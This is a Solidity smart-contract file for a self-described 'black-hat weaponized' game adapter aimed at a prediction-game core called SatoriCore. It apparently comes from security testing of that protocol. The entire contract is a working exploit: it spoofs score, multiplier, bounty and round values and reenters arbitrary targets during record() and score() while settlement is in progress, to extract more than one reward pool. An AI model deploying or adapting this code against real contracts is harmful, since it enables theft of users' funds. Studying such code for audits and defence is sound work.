// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../interfaces/IPredictionGame.sol";
import "../interfaces/ISatoriCore.sol";

/// @notice BLACK-HAT weaponized game adapter. Registered permissionlessly via
///         registerCommunityGameAdapter. Gives the attacker FULL control of:
///           - what score() announces (userScore, multiplier, total, bountyTotal, roundIndex)
///           - reentrancy during BOTH record() and score() into an arbitrary
///             (target, calldata) — success/return swallowed so the outer batch
///             is never reverted (unless bubble=true).
///
///         The point: record()/score() run while the CORE is mid-predict/mid-settle
///         (guard on core._status). Reentering claim()/withdrawBounty()/unstake/
///         setValue targets guards on OTHER contracts — NOT tripped. We hunt for
///         a state the reentry mutates that the settle reward math then reads
///         inconsistently, to extract more than one pool.
contract OmniReentryAdapter is IPredictionGame {
    address public immutable core;

    // score() announcement knobs — attacker sets these before settling.
    bool    public sScored = true;
    uint256 public sUserScore;      // if 0, uses pending weight
    uint256 public sMultiplier = 1;
    uint256 public sTotal;          // if 0, uses pending weight
    uint256 public sBountyTotal;
    uint64  public sRoundOverride;  // if !=0, override announced round (attacker-picked)
    bool    public allowSameRound;  // if true, score() resolves even in the predict round

    // Reentry config — separate for record() and score().
    address public recTarget;  bytes public recData;  bool public recBubble;
    address public scoreTarget; bytes public scoreData; bool public scoreBubble;

    bool public inReenter;
    bool public recLastOk;   bytes public recLastRet;   bool public recFired;
    bool public scoreLastOk; bytes public scoreLastRet; bool public scoreFired;

    mapping(uint32 => mapping(address => uint64))  public pendingRound;
    mapping(uint32 => mapping(address => uint256)) public pendingWeight;

    constructor(address _core) { core = _core; }

    // ---- knob setters ----
    function setScore(bool sc, uint256 us, uint256 mult, uint256 tot, uint256 bt, uint64 roundOverride) external {
        sScored = sc; sUserScore = us; sMultiplier = mult; sTotal = tot; sBountyTotal = bt; sRoundOverride = roundOverride;
    }
    function setAllowSameRound(bool v) external { allowSameRound = v; }
    function armRecord(address t, bytes calldata d, bool bubble) external { recTarget = t; recData = d; recBubble = bubble; }
    function armScore(address t, bytes calldata d, bool bubble) external { scoreTarget = t; scoreData = d; scoreBubble = bubble; }
    function disarmRecord() external { recTarget = address(0); }
    function disarmScore() external { scoreTarget = address(0); }

    function validateForStream(uint32, bytes calldata) external pure override {}

    function record(address user, uint32 gameId, uint256 predictionPower, uint256, bytes calldata)
        external override
    {
        require(msg.sender == core, "only core");
        pendingWeight[gameId][user] = predictionPower;
        pendingRound[gameId][user] = uint64(ISatoriCore(core).getCurrentRound());
        if (recTarget != address(0) && !inReenter) {
            inReenter = true;
            (bool ok, bytes memory ret) = recTarget.call(recData);
            inReenter = false;
            recLastOk = ok; recLastRet = ret; recFired = true;
            if (!ok && recBubble) { assembly { revert(add(ret, 0x20), mload(ret)) } }
        }
    }

    function score(address user, uint32 gameId)
        external override
        returns (bool scored, uint256 userScore, uint256 multiplier, uint256 total, uint256 bountyTotal, uint64 roundIndex)
    {
        require(msg.sender == core, "only core");
        uint64 r = pendingRound[gameId][user];
        if (r == 0) return (false, 0, 0, 0, 0, 0);
        uint64 cur = uint64(ISatoriCore(core).getCurrentRound());
        if (!allowSameRound && cur <= r) return (false, 0, 0, 0, 0, 0);

        if (scoreTarget != address(0) && !inReenter) {
            inReenter = true;
            (bool ok, bytes memory ret) = scoreTarget.call(scoreData);
            inReenter = false;
            scoreLastOk = ok; scoreLastRet = ret; scoreFired = true;
            if (!ok && scoreBubble) { assembly { revert(add(ret, 0x20), mload(ret)) } }
        }

        uint256 w = pendingWeight[gameId][user];
        delete pendingRound[gameId][user];
        delete pendingWeight[gameId][user];

        if (!sScored) return (false, 0, 0, 0, 0, 0);
        uint256 us = sUserScore == 0 ? w : sUserScore;
        uint256 tot = sTotal == 0 ? w : sTotal;
        uint64 rr = sRoundOverride == 0 ? r : sRoundOverride;
        return (true, us, sMultiplier, tot, sBountyTotal, rr);
    }
}
